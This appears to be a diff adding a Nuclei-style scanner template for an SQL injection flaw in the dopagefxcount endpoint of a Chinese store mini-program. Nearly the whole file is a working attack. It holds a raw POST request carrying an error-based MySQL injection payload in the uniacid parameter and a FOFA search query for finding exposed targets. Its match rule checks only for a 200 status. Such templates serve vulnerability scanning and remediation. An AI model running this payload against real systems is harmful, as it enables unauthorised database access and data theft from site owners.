@@ -1,0 +1,28 @@
+id: poc-dopqizadb5we353z
+info:
+  name: 万能门店小程序 dopagefxcount 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dopqizadb5we353z'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dopqizadb5we353z
+    fofa: body="/comhome/cases/index.html"
+http:
+- raw:
+  - 'POST /api/wxapps/dopagefxcount HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    uniacid=1 OR GTID_SUBSET(CONCAT((SELECT(md5(''123'')))),3119)-- 123&suid=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
